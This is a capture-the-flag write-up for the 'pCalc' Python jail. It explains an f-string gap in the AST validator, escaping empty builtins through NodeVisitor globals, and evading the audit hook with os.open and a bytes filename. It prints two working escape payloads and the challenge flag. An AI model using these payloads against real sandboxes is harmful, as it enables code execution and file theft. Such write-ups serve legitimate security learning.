#Challenge: pCalc

Category: Pwn / Python Jail

    Description: Just a super secure calculator, making sure no funny business goes on except math homework...
    ncat --ssl pcalc.ctf.prgy.in 1337
    
#Files Provided
chal.py

#Challenge Overview

pCalc is a remote Python sandbox that presents itself as a simple calculator. However, beneath the surface lies a "jail" with multiple layers of security designed to prevent Arbitrary Code Execution (ACE).

The goal was to read a file named flag.txt on the remote server by bypassing an AST validator, a restricted execution environment, and Python's internal audit hooks.

#Analysis of the Security Layers

We are given the source code chal.py. To break out, we first had to understand the three walls built around the eval() function.
1. The AST Validator

The script uses the ast module to parse user input before execution. It only allows safe nodes like ast.BinOp (addition/subtraction) and ast.Constant.

The Vulnerability: Lack of Recursive Validation in ast.JoinedStr The specific vulnerability here is an Incomplete AST Policy Enforcement. While the validator checks most node types, it explicitly includes a pass for ast.JoinedStr (the node type for f-strings).

In Python's AST, an f-string is a container. By failing to recursively call self.visit() on the expressions inside the curly braces {...}, the validator creates a "trusted tunnel." Anything placed inside those braces is treated as a literal part of the string during the validation phase but is fully executed as code during the eval() phase. This allows us to use forbidden nodes like ast.Call (function calls) and ast.Attribute (dot notation) that are normally blocked.
2. The Global Sandbox

The eval() function is called with safe_globals = {"__builtins__": {}}. This removes standard functions like __import__, open, str, and getattr, making it difficult to interact with the system.
3. The Audit Hook

The script implements sys.addaudithook to monitor system-level events:

    Command Execution: Blocks os.system, os.popen, and subprocess.

    File Access: Blocks the open event if the filename is a string and contains the word "flag".

#Phase 1: Reconnaissance (Listing Files)

We first needed to confirm the existence of the flag. Since we were in an environment with no __builtins__, we had to reconstruct the os module by traversing the class hierarchy.
The "NodeVisitor" Bridge

Instead of guessing indices in __subclasses__(), we used the fact that the script itself defines a Calculator class inheriting from ast.NodeVisitor. This class is guaranteed to be in the subclasses list, and its __globals__ contains the os module.
The ls Payload:

When you connect to the challenge using the provided ncat command (or run the file locally), the service waits for user input. All payloads listed below must be entered directly when prompted by the calculator.

```
f"{ (lambda m, output: m.write(1, f'{output}'.encode())) ([c.visit.__globals__['sys'].modules['os'] for c in (1).__class__.__base__.__subclasses__() if c.__name__ == 'NodeVisitor'][0], [c.visit.__globals__['sys'].modules['os'] for c in (1).__class__.__base__.__subclasses__() if c.__name__ == 'NodeVisitor'][0].listdir('.')) }"
```

Breakdown of the Construction
1. The Shell: The f-string Bypass

    The Problem: The Calculator(ast.NodeVisitor) class strictly checks every part of your input. It usually blocks ast.Call and ast.Attribute.

    The Vulnerability: The code has a "blind spot": elif isinstance(node, ast.JoinedStr): pass.

    The Fix: By wrapping the entire payload in f"{ ... }", the validator sees an ast.JoinedStr and ignores the contents. The expression inside {} is executed freely.

2. The Engine: The NodeVisitor Bridge

    The Problem: eval() runs with empty built-ins, so import, os, and sys are gone.

    The Vulnerability: All Python objects are connected.

    The Fix: We climb from (1) to object and scan __subclasses__(). We specifically look for NodeVisitor. Since chal.py defines class Calculator(ast.NodeVisitor), the NodeVisitor class is loaded, and its __globals__ contains the imports defined in chal.py (specifically os).

3. The Logic: The Lambda Wrapper

    The Problem: We need to find os and then use it in a single expression.

    The Fix: We use a lambda: (lambda m, output: ...)(Engine, Data).

        m receives the os module.

        output receives os.listdir('.').

4. The Bypass: m.write(1, ...)

    The Problem: The challenge only prints the result if it is a number (int, float).

    The Fix: We use os.write(1, ...), which writes directly to the standard output (stdout) file descriptor. This forces the server to send the data immediately, bypassing the final type check.

Output:
```
['run', 'flag.txt']
```

#Phase 2: Bypassing the Audit Hook

Now that we confirmed flag.txt existed, we faced the Audit Hook. A standard open("flag.txt") would trigger a RuntimeError.
Python

if event == 'open' and isinstance(args[0], str) and 'flag' in args[0]:
    raise RuntimeError("Forbidden File Access")

The Bypass Strategy

The hook has two critical weaknesses:

    It only monitors the event named 'open'. It does not monitor os.open (which triggers posix.open).

    It only checks if the argument is a string. If we pass the filename as bytes (b'flag.txt'), the isinstance(args[0], str) check returns False, and the hook ignores the action.

#Phase 3: The Final Exploit

By combining the NodeVisitor bridge with the os.open byte-string bypass, we arrived at the final payload.
```
f"{ (lambda m: m.write(1, m.read(m.open(b'flag.txt', 0), 100))) ([c.visit.__globals__['sys'].modules['os'] for c in (1).__class__.__base__.__subclasses__() if c.__name__ == 'NodeVisitor'][0]) }"
```

When prompted by the file

Exploit Breakdown
Component	Function
f"{ ... }"	Escapes the AST validator.
c.visit.__globals__	Reaches back into the script's main namespace to grab sys and os.
m.open(b'flag.txt', 0)	Opens the flag using a byte string to bypass the Audit Hook's isinstance check.
m.read(..., 100)	Reads the contents of the file descriptor returned by os.open.
m.write(1, ...)	Forces the flag directly to the terminal output.

Success! The server executes the low-level read and writes the flag to the stream before the restricted eval can even finish its type-check.
🚩 Flag

```
p_ctf{CHA7C4LCisJUst$HorTf0rcaLCUla70r}
```
